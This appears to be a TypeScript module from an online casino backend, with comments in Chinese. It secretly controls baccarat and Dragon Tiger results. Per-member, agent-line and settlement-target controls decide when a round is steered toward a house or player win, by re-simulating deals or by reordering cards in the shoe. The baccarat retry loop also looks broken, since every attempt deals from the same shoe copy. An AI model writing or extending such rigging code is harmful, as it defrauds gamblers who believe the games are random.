/**
 * 遊戲開獎控制模組
 *
 * 支援三種控制類型：
 * 1. 自動偵測控制 (ManualDetectionControl) - 根據目標上級交收控制
 * 2. 會員輸贏控制 (WinCapControl) - 針對特定會員的機率控制
 * 3. 代理線輸贏控制 (AgentLineWinCap) - 針對代理線下所有會員的機率控制
 */

import { prisma } from '../lib/prisma.js';
import { randomInt } from 'crypto';
import type { Card, RoundResult } from './gameLogic.js';
import { playRound as originalPlayRound, calculatePoints, isPair, createShoe, burnCards } from './gameLogic.js';
import type { DragonTigerRoundResult } from './dragonTigerLogic.js';
import { playDragonTigerRound as originalPlayDragonTigerRound } from './dragonTigerLogic.js';

// 遊戲日開始時間（7:00 AM Taiwan time）
function getGameDayStart(): Date {
  const now = new Date();
  const start = new Date(now);
  start.setHours(7, 0, 0, 0);
  if (now.getHours() < 7) {
    start.setDate(start.getDate() - 1);
  }
  return start;
}

// 遞歸獲取代理線下所有會員 ID
async function getAgentDownlineMembers(agentId: string): Promise<string[]> {
  const memberIds: string[] = [];

  const directMembers = await prisma.user.findMany({
    where: { parentAgentId: agentId, role: 'member' },
    select: { id: true },
  });
  memberIds.push(...directMembers.map(m => m.id));

  const subAgents = await prisma.user.findMany({
    where: { parentAgentId: agentId, role: 'agent' },
    select: { id: true },
  });

  for (const subAgent of subAgents) {
    const subMembers = await getAgentDownlineMembers(subAgent.id);
    memberIds.push(...subMembers);
  }

  return memberIds;
}

// 計算當前上級交收
async function calculateCurrentSettlement(
  scope: 'all' | 'agent_line' | 'member',
  targetAgentId?: string | null,
  targetMemberUsername?: string | null
): Promise<number> {
  const gameDayStart = getGameDayStart();
  let memberIds: string[] = [];

  if (scope === 'all') {
    const allMembers = await prisma.user.findMany({
      where: { role: 'member' },
      select: { id: true },
    });
    memberIds = allMembers.map(m => m.id);
  } else if (scope === 'agent_line' && targetAgentId) {
    memberIds = await getAgentDownlineMembers(targetAgentId);
  } else if (scope === 'member' && targetMemberUsername) {
    const member = await prisma.user.findUnique({
      where: { username: targetMemberUsername },
      select: { id: true },
    });
    if (member) {
      memberIds = [member.id];
    }
  }

  if (memberIds.length === 0) {
    return 0;
  }

  const bets = await prisma.bet.aggregate({
    where: {
      userId: { in: memberIds },
      createdAt: { gte: gameDayStart },
      status: { in: ['won', 'lost'] },
    },
    _sum: { payout: true, amount: true },
  });

  const totalBet = Number(bets._sum.amount || 0);
  const totalPayout = Number(bets._sum.payout || 0);
  const memberWinLoss = totalPayout - totalBet;
  const rebatePercent = 0.041;
  const totalRebate = totalBet * rebatePercent;
  const superiorSettlement = memberWinLoss + totalRebate;

  return superiorSettlement;
}

// ============================================
// 控制決策介面
// ============================================

interface ControlDecision {
  shouldControl: boolean;
  favorHouse: boolean;  // true = 讓莊家贏，false = 讓閒家贏（百家樂）或 讓龍贏/虎贏
  controlPercentage: number;
  source?: string;  // 控制來源
}

// ============================================
// 檢查會員/代理線輸贏控制
// ============================================

interface BettingUserInfo {
  userId: string;
  betType: string;  // 'player', 'banker', 'tie', 'dragon', 'tiger', etc.
  amount: number;
}

async function checkMemberAgentControl(bettingUsers: BettingUserInfo[]): Promise<ControlDecision> {
  try {
    if (bettingUsers.length === 0) {
      return { shouldControl: false, favorHouse: false, controlPercentage: 0 };
    }

    // 取得所有下注用戶的 ID
    const userIds = [...new Set(bettingUsers.map(u => u.userId))];

    // 1. 檢查會員個人控制
    const memberControls = await prisma.winCapControl.findMany({
      where: {
        userId: { in: userIds },
        enabled: true,
      },
      include: {
        user: { select: { username: true } },
      },
    });

    for (const control of memberControls) {
      const random = randomInt(100);
      if (random < control.controlPercentage) {
        const favorHouse = control.controlDirection === 'lose';  // 'lose' = 讓他輸 = 平台贏
        console.log(`[GameControl] 會員控制啟動: user=${control.user.username}, direction=${control.controlDirection}, percentage=${control.controlPercentage}%, favorHouse=${favorHouse}`);
        return {
          shouldControl: true,
          favorHouse,
          controlPercentage: control.controlPercentage,
          source: `member:${control.user.username}`,
        };
      }
    }

    // 2. 檢查代理線控制
    // 獲取用戶的上級代理
    const users = await prisma.user.findMany({
      where: { id: { in: userIds } },
      select: { id: true, parentAgentId: true },
    });

    const agentIds = [...new Set(users.map(u => u.parentAgentId).filter(Boolean))] as string[];

    if (agentIds.length > 0) {
      // 遞歸獲取所有上級代理（含直屬和更上層）
      const allAgentIds = new Set<string>(agentIds);

      // 獲取上級代理的上級
      const getParentAgents = async (ids: string[]): Promise<void> => {
        const agents = await prisma.user.findMany({
          where: { id: { in: ids } },
          select: { parentAgentId: true },
        });
        const parentIds = agents.map(a => a.parentAgentId).filter(Boolean) as string[];
        for (const pid of parentIds) {
          if (!allAgentIds.has(pid)) {
            allAgentIds.add(pid);
          }
        }
        if (parentIds.length > 0) {
          await getParentAgents(parentIds);
        }
      };

      await getParentAgents(agentIds);

      const agentLineControls = await prisma.agentLineWinCap.findMany({
        where: {
          agentId: { in: [...allAgentIds] },
          enabled: true,
        },
        include: {
          agent: { select: { username: true } },
        },
      });

      for (const control of agentLineControls) {
        const random = randomInt(100);
        if (random < control.controlPercentage) {
          const favorHouse = control.controlDirection === 'lose';
          console.log(`[GameControl] 代理線控制啟動: agent=${control.agent.username}, direction=${control.controlDirection}, percentage=${control.controlPercentage}%, favorHouse=${favorHouse}`);
          return {
            shouldControl: true,
            favorHouse,
            controlPercentage: control.controlPercentage,
            source: `agent_line:${control.agent.username}`,
          };
        }
      }
    }

    return { shouldControl: false, favorHouse: false, controlPercentage: 0 };
  } catch (error) {
    console.error('[GameControl] 檢查會員/代理控制失敗:', error);
    return { shouldControl: false, favorHouse: false, controlPercentage: 0 };
  }
}

// ============================================
// 檢查自動偵測控制
// ============================================

async function checkAutoDetectionControl(): Promise<ControlDecision> {
  try {
    // 獲取所有活動的控制
    const activeControls = await prisma.manualDetectionControl.findMany({
      where: { isActive: true, isCompleted: false },
    });

    if (activeControls.length === 0) {
      return { shouldControl: false, favorHouse: false, controlPercentage: 0 };
    }

    // 檢查每個控制
    for (const control of activeControls) {
      const currentSettlement = await calculateCurrentSettlement(
        control.scope as 'all' | 'agent_line' | 'member',
        control.targetAgentId,
        control.targetMemberUsername
      );

      const targetSettlement = Number(control.targetSettlement);

      // 計算是否需要控制
      // 如果當前交收 > 目標交收（平台虧損），需要讓平台贏
      // 如果當前交收 < 目標交收，需要讓玩家贏
      const shouldControlDirection = currentSettlement > targetSettlement;

      // 只有當還沒達標時才控制
      if (
        (shouldControlDirection && currentSettlement > targetSettlement) ||
        (!shouldControlDirection && currentSettlement < targetSettlement)
      ) {
        // 根據控制機率決定是否這局進行控制
        const random = randomInt(100);
        if (random < control.controlPercentage) {
          console.log(`[GameControl] 自動偵測控制啟動: scope=${control.scope}, 當前=${currentSettlement.toFixed(2)}, 目標=${targetSettlement.toFixed(2)}, favorHouse=${shouldControlDirection}`);
          return {
            shouldControl: true,
            favorHouse: shouldControlDirection, // true = 讓平台贏（莊家贏）
            controlPercentage: control.controlPercentage,
            source: `auto_detection:${control.scope}`,
          };
        }
      }

      // 檢查是否達標
      if (
        (targetSettlement <= 0 && currentSettlement <= targetSettlement) ||
        (targetSettlement > 0 && currentSettlement >= targetSettlement)
      ) {
        // 標記為已完成
        await prisma.manualDetectionControl.update({
          where: { id: control.id },
          data: {
            isCompleted: true,
            completedAt: new Date(),
            completionSettlement: currentSettlement,
          },
        });
        console.log(`[GameControl] 自動偵測達標: scope=${control.scope}, 最終交收=${currentSettlement.toFixed(2)}`);
      }
    }

    return { shouldControl: false, favorHouse: false, controlPercentage: 0 };
  } catch (error) {
    console.error('[GameControl] 檢查自動偵測控制失敗:', error);
    return { shouldControl: false, favorHouse: false, controlPercentage: 0 };
  }
}

// ============================================
// 統一控制檢查（優先順序：會員 > 代理線 > 自動偵測）
// ============================================

async function checkControlNeeded(bettingUsers?: BettingUserInfo[]): Promise<ControlDecision> {
  // 1. 先檢查會員/代理線控制（針對性控制優先）
  if (bettingUsers && bettingUsers.length > 0) {
    const memberAgentControl = await checkMemberAgentControl(bettingUsers);
    if (memberAgentControl.shouldControl) {
      return memberAgentControl;
    }
  }

  // 2. 再檢查自動偵測控制
  return checkAutoDetectionControl();
}

// ============================================
// 百家樂控制開獎
// ============================================

/**
 * 控制百家樂開獎結果
 * 通過多次模擬，選擇符合控制方向的結果
 */
export async function playControlledBaccaratRound(
  shoe: Card[],
  bettingUsers?: BettingUserInfo[]
): Promise<RoundResult> {
  const control = await checkControlNeeded(bettingUsers);

  if (!control.shouldControl) {
    // 不需要控制，正常開獎
    return originalPlayRound(shoe);
  }

  // 需要控制：嘗試多次找到符合方向的結果
  const maxAttempts = 10;
  let bestResult: RoundResult | null = null;

  // 創建臨時牌組來模擬
  for (let attempt = 0; attempt < maxAttempts; attempt++) {
    // 複製當前牌組狀態
    const tempShoe = [...shoe];
    const result = simulateBaccaratRound(tempShoe);

    if (control.favorHouse) {
      // 平台需要贏：優先莊家贏，其次和局
      if (result.result === 'banker') {
        bestResult = result;
        break;
      } else if (result.result === 'tie' && !bestResult) {
        bestResult = result;
      }
    } else {
      // 平台需要輸（讓玩家贏）：優先閒家贏
      if (result.result === 'player') {
        bestResult = result;
        break;
      }
    }

    if (!bestResult) {
      bestResult = result;
    }
  }

  // 使用最佳結果
  if (bestResult) {
    // 從牌組中移除使用的牌
    const cardsUsed = bestResult.playerCards.length + bestResult.bankerCards.length;
    for (let i = 0; i < cardsUsed; i++) {
      shoe.pop();
    }

    console.log(`[GameControl] 百家樂控制結果: ${bestResult.result} (P:${bestResult.playerPoints} vs B:${bestResult.bankerPoints}) [${control.source}]`);
    return bestResult;
  }

  // 無法控制，返回正常結果
  return originalPlayRound(shoe);
}

// 模擬百家樂開獎（不修改原牌組）
function simulateBaccaratRound(shoe: Card[]): RoundResult {
  if (shoe.length < 6) {
    // 牌不夠，創建新牌
    const newShoe = createShoe();
    burnCards(newShoe);
    shoe.length = 0;
    shoe.push(...newShoe);
  }

  // 發牌
  const playerCards: Card[] = [shoe[shoe.length - 1], shoe[shoe.length - 3]];
  const bankerCards: Card[] = [shoe[shoe.length - 2], shoe[shoe.length - 4]];

  let playerPoints = calculatePoints(playerCards);
  let bankerPoints = calculatePoints(bankerCards);

  const playerPair = isPair(playerCards);
  const bankerPair = isPair(bankerCards);

  // 檢查例牌
  const playerNatural = playerPoints >= 8;
  const bankerNatural = bankerPoints >= 8;

  let cardsUsed = 4;

  if (!playerNatural && !bankerNatural) {
    // 閒家補牌規則
    let playerThirdCard: Card | null = null;
    if (playerPoints <= 5 && shoe.length > cardsUsed) {
      playerThirdCard = shoe[shoe.length - cardsUsed - 1];
      playerCards.push(playerThirdCard);
      playerPoints = calculatePoints(playerCards);
      cardsUsed++;
    }

    // 莊家補牌規則
    if (shoe.length > cardsUsed) {
      let bankerShouldDraw = false;
      if (!playerThirdCard) {
        bankerShouldDraw = bankerPoints <= 5;
      } else {
        const pv = playerThirdCard.value;
        switch (bankerPoints) {
          case 0: case 1: case 2: bankerShouldDraw = true; break;
          case 3: bankerShouldDraw = pv !== 8; break;
          case 4: bankerShouldDraw = pv >= 2 && pv <= 7; break;
          case 5: bankerShouldDraw = pv >= 4 && pv <= 7; break;
          case 6: bankerShouldDraw = pv === 6 || pv === 7; break;
          default: bankerShouldDraw = false;
        }
      }

      if (bankerShouldDraw) {
        bankerCards.push(shoe[shoe.length - cardsUsed - 1]);
        bankerPoints = calculatePoints(bankerCards);
        cardsUsed++;
      }
    }
  }

  // 判定結果
  let result: 'player' | 'banker' | 'tie';
  if (playerPoints > bankerPoints) {
    result = 'player';
  } else if (bankerPoints > playerPoints) {
    result = 'banker';
  } else {
    result = 'tie';
  }

  return {
    playerCards,
    bankerCards,
    playerPoints,
    bankerPoints,
    result,
    playerPair,
    bankerPair,
  };
}

// ============================================
// 龍虎控制開獎
// ============================================

/**
 * 控制龍虎開獎結果
 */
export async function playControlledDragonTigerRound(
  shoe: Card[],
  bettingUsers?: BettingUserInfo[]
): Promise<DragonTigerRoundResult> {
  const control = await checkControlNeeded(bettingUsers);

  if (!control.shouldControl) {
    return originalPlayDragonTigerRound(shoe);
  }

  // 龍虎只需要兩張牌，可以直接控制
  const maxAttempts = 20;

  for (let attempt = 0; attempt < maxAttempts; attempt++) {
    // 隨機選擇牌組中的兩張牌
    if (shoe.length < 2) break;

    const idx1 = randomInt(shoe.length);
    let idx2 = randomInt(shoe.length);
    while (idx2 === idx1) {
      idx2 = randomInt(shoe.length);
    }

    const card1 = shoe[idx1];
    const card2 = shoe[idx2];

    // 檢查結果是否符合控制方向
    const value1 = card1.value;
    const value2 = card2.value;

    let result: 'dragon' | 'tiger' | 'tie';
    if (value1 > value2) {
      result = 'dragon';
    } else if (value2 > value1) {
      result = 'tiger';
    } else {
      result = 'tie';
    }

    // 龍虎的控制邏輯：
    // favorHouse = true: 和局最有利（玩家輸一半），或者讓少數派贏
    // favorHouse = false: 讓多數派贏

    let isGoodResult = false;
    if (control.favorHouse) {
      // 平台需要贏：優先和局
      isGoodResult = result === 'tie';
    } else {
      // 平台需要輸：龍或虎都行（避免和局）
      isGoodResult = result !== 'tie';
    }

    if (isGoodResult) {
      // 找到好結果，重新排列牌組
      // 將選中的兩張牌移到牌組頂部
      const dragonCard = result === 'dragon' || result === 'tie' ? card1 : card2;
      const tigerCard = result === 'dragon' || result === 'tie' ? card2 : card1;

      // 移除並重新添加到頂部
      shoe.splice(Math.max(idx1, idx2), 1);
      shoe.splice(Math.min(idx1, idx2), 1);
      shoe.push(tigerCard);
      shoe.push(dragonCard);

      const finalResult = originalPlayDragonTigerRound(shoe);
      console.log(`[GameControl] 龍虎控制結果: ${finalResult.result} (D:${finalResult.dragonValue} vs T:${finalResult.tigerValue}) [${control.source}]`);
      return finalResult;
    }
  }

  // 無法控制，返回正常結果
  return originalPlayDragonTigerRound(shoe);
}

// 導出給其他模組使用
export { checkControlNeeded, checkMemberAgentControl, checkAutoDetectionControl };
export type { BettingUserInfo, ControlDecision };
